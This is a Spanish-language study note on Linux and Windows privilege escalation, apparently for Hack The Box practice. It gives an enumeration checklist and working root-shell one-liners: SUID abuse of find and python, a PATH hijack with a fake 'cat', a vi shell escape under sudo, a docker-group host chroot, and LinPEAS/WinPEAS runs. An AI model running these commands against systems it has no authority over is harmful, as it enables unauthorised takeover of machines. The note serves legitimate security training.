

> [!info] Relacionado con
> [[Explotación de Servicios - Linux]] · [[Explotación de Servicios - Windows]] · [[Reverse Shells y Post-Explotación]] · [[Linux - Fundamentos]] · [[Pivoting y Movilidad Lateral]] · [[Análisis Forense y Memoria]]

---

## ① Conceptos clave

Después de obtener una shell (normalmente `www-data` o un usuario limitado), hay que **escalar** hasta root/Administrator.

### Tipos de cuenta

| Tipo | Características | Ejemplos |
|------|----------------|---------|
| **Servicio** | Permisos reducidos, sin /home real | www-data, apache |
| **Usuario** | /home propio, shell (/bin/bash) | summer, robert |
| **Administrador** | Máxima autoridad, /root | root |

---

## ② Checklist de escalada (siempre en este orden)

```bash
# 1. ¿Qué puedo ejecutar como root sin contraseña?
sudo -l

# 2. ¿Qué grupos tengo?
id

# 3. ¿Qué binarios tienen SUID?
find / -perm -4000 2>/dev/null

# 4. ¿Qué hay en /etc/crontab?
cat /etc/crontab

# 5. ¿Qué ficheros soy escribible?
find / -writable -type f 2>/dev/null

# 6. ¿Qué versiones de software corren?
uname -a
cat /etc/os-release
```

---

## ③ Vector: SUID

Binarios que se ejecutan con los permisos de su propietario (normalmente root).

```bash
# Buscar SUID
find / -perm -4000 2>/dev/null

# Si find tiene SUID → trivial
find / -exec /bin/sh -p \;

# Si python tiene SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# GTFOBins: referencia para abusar de binarios
# https://gtfobins.github.io/
```

---

## ④ Vector: Secuestro de PATH

Cuando un binario ejecuta un comando **sin ruta absoluta**:

```bash
# Ejemplo: binario bugtracker ejecuta "cat" sin ruta absoluta
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker # ejecuta nuestro "cat" malicioso como root
```

> [!important] POR QUÉ FUNCIONA
> El sistema busca `cat` recorriendo PATH. Al anteponer `/tmp`, encuentra nuestro `cat` falso primero. Como el binario corre como root, nuestra shell también.

---

## ⑤ Vector: sudo + GTFOBins

```bash
# Si sudo -l dice que puedes ejecutar vi como root
sudo /bin/vi /ruta/permitida
# Dentro de vi:
:!/bin/bash # → shell como root
```

> [!tip] GTFOBins
> Consulta `gtfobins.github.io` para cada binario. Busca el binario + contexto (sudo, SUID, docker...).

---

## ⑥ Vector: Grupos peligrosos

| Grupo | Explotación |
|-------|-----------|
| **docker** | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| **lxd** | Crear contenedor con acceso al host |
| **disk** | Leer /etc/shadow directamente |
| **bugtracker** (a medida) | Binario SUID del grupo |

---

## ⑦ Vector: LinPEAS / WinPEAS

```bash
# Linux
chmod +x linpeas.sh
./linpeas.sh

# Windows
.\winpeas.exe
```

> [!tip] COLORES
> **Rojo + amarillo** = muy interesante, revisar a fondo.
> **Rojo** = revisar.
> El 80% del hacking es **enumerar**.

---

## ⑧ Conexión con otras áreas

| Área | Cómo encaja |
|------|------------|
| [[Linux - Fundamentos]] | Permisos, SUID, rutas |
| [[Explotación de Servicios - Linux]] | SSH, hashes, escalationes |
| [[Explotación de Servicios - Windows]] | WinPEAS, psexec |
| [[Prácticas CTF - HTB y VulnHub]] | Oopsie, Archetype, Vaccine |

---

## Checklist de repaso

- [ ] ¿Sé ejecutar el checklist de escalada en orden?
- [ ] ¿Entiendo qué es el SUID y cómo explotarlo?
- [ ] ¿Sé ejecutar un secuestro de PATH?
- [ ] ¿Conozco GTFOBins y sé usarlo?
- [ ] ¿Sé interpretar el informe de LinPEAS?

---

## Enlaces relacionados

- [[comandos/Linux]] — Comandos de referencia
- [[Prácticas CTF - HTB y VulnHub]] — Walkthroughs con escalada


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Netcat / Reverse Shells, Post-Explotación, SMB / Impacket
- [[Metodología de Explotación.md|Metodología de Explotación]] — Netcat / Reverse Shells, Pivoting / Movilidad Lateral, Post-Explotación
- [[../../apuntes Andres/12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype.md|12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype]] — Netcat / Reverse Shells, Post-Explotación, SMB / Impacket
- [[../08 - Metodologías/Metodología - Explotación Linux.md|Metodología - Explotación Linux]] — Netcat / Reverse Shells, Post-Explotación, Reverse Shells
- [[../11 - Forense Digital/Análisis Forense y Memoria.md|Análisis Forense y Memoria]] — Netcat / Reverse Shells, Pivoting / Movilidad Lateral, Post-Explotación
- [[Explotación de Servicios - Linux.md|Explotación de Servicios - Linux]] — Netcat / Reverse Shells, Post-Explotación, Reverse Shells

### 🛠️ Herramientas

- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/SMB_Impacket|SMB / Impacket]]
- [[comandos/SSH|SSH]]

> #forense #hack-the-box #linux #netcat #pivoting #post-explotacion #redes #reverse-shell #smb-impacket #ssh #vulnhub #windows
